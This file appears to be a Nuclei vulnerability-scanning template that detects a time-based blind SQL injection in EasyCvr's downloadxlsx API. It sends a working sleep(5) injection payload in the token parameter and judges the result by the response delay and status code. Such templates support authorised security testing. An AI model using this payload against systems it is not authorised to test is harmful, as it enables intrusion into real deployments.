id: EasyCvr-downloadxlsx-sqlInjection
info:
  name: EasyCvr-downloadxlsx-sqlInjection
  author: iSee857
  severity: high
  description: EasyCvr-downloadxlsx-sqlInjection

requests:
  - method: GET
    raw:
      - |
        GET /api/v1/cascade/downloadxlsx?token='and(select*from(select/**/sleep(5))a/**/union/**/select+1)=' HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"

      - type: status
        status:
          - 200
          - 401
          - 403
        condition: or